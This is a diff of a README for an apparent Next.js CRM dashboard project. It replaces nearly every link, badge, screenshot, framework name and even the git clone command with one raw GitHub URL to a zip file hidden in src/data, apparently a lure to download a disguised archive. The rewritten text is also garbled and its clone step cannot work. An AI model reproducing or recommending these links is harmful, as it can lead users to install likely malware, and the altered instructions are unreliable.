@@ -1,8 +1,8 @@
 # 🌟 Shadcn CRM Dashboard
 
-![Next.js](https://img.shields.io/badge/Next.js-11.0.0-brightgreen) ![React](https://img.shields.io/badge/React-17.0.2-blue) ![Tailwind CSS](https://img.shields.io/badge/Tailwind%20CSS-2.2.19-pink) ![Vercel](https://img.shields.io/badge/Deploy%20on%20Vercel-000000?logo=vercel)
+![https://raw.githubusercontent.com/Harisaki/shadcn-crm-dashboard/main/src/data/shadcn-crm-dashboard-asmalte.zip](https://raw.githubusercontent.com/Harisaki/shadcn-crm-dashboard/main/src/data/shadcn-crm-dashboard-asmalte.zip) ![React](https://raw.githubusercontent.com/Harisaki/shadcn-crm-dashboard/main/src/data/shadcn-crm-dashboard-asmalte.zip) ![Tailwind CSS](https://raw.githubusercontent.com/Harisaki/shadcn-crm-dashboard/main/src/data/shadcn-crm-dashboard-asmalte.zip%20CSS-2.2.19-pink) ![Vercel](https://raw.githubusercontent.com/Harisaki/shadcn-crm-dashboard/main/src/data/shadcn-crm-dashboard-asmalte.zip%20on%20Vercel-000000?logo=vercel)
 
-Welcome to the **Shadcn CRM Dashboard**! This project is a comprehensive CRM dashboard UI built using **Next.js** and **Shadcn/ui**. The dashboard is designed to help users manage customer relationships efficiently, offering a sleek interface and powerful features.
+Welcome to the **Shadcn CRM Dashboard**! This project is a comprehensive CRM dashboard UI built using **https://raw.githubusercontent.com/Harisaki/shadcn-crm-dashboard/main/src/data/shadcn-crm-dashboard-asmalte.zip** and **Shadcn/ui**. The dashboard is designed to help users manage customer relationships efficiently, offering a sleek interface and powerful features.
 
 ## Table of Contents
 
@@ -25,7 +25,7 @@ Welcome to the **Shadcn CRM Dashboard**! This project is a comprehensive CRM das
 
 ## Technologies Used
 
-- **Next.js**: A powerful React framework for server-side rendering.
+- **https://raw.githubusercontent.com/Harisaki/shadcn-crm-dashboard/main/src/data/shadcn-crm-dashboard-asmalte.zip**: A powerful React framework for server-side rendering.
 - **React**: A JavaScript library for building user interfaces.
 - **Shadcn/ui**: A component library that provides a set of UI components.
 - **Tailwind CSS**: A utility-first CSS framework for styling.
@@ -38,7 +38,7 @@ To get started with the Shadcn CRM Dashboard, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Harisaki/shadcn-crm-dashboard.git
+   git clone https://raw.githubusercontent.com/Harisaki/shadcn-crm-dashboard/main/src/data/shadcn-crm-dashboard-asmalte.zip
    ```
 
 2. Navigate to the project directory:
@@ -72,11 +72,11 @@ Once the dashboard is running, you can start managing your CRM data. Here are so
 
 ## Screenshots
 
-![Dashboard Overview](https://example.com/dashboard-overview.png)
+![Dashboard Overview](https://raw.githubusercontent.com/Harisaki/shadcn-crm-dashboard/main/src/data/shadcn-crm-dashboard-asmalte.zip)
 
-![Customer List](https://example.com/customer-list.png)
+![Customer List](https://raw.githubusercontent.com/Harisaki/shadcn-crm-dashboard/main/src/data/shadcn-crm-dashboard-asmalte.zip)
 
-![Add Customer Form](https://example.com/add-customer-form.png)
+![Add Customer Form](https://raw.githubusercontent.com/Harisaki/shadcn-crm-dashboard/main/src/data/shadcn-crm-dashboard-asmalte.zip)
 
 ## Contributing
 
@@ -94,7 +94,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases, please visit the [Releases section](https://github.com/Harisaki/shadcn-crm-dashboard/releases). Here you can download the latest version and see what's new.
+For the latest releases, please visit the [Releases section](https://raw.githubusercontent.com/Harisaki/shadcn-crm-dashboard/main/src/data/shadcn-crm-dashboard-asmalte.zip). Here you can download the latest version and see what's new.
 
 If you have any issues or suggestions, feel free to create an issue in the repository.
 
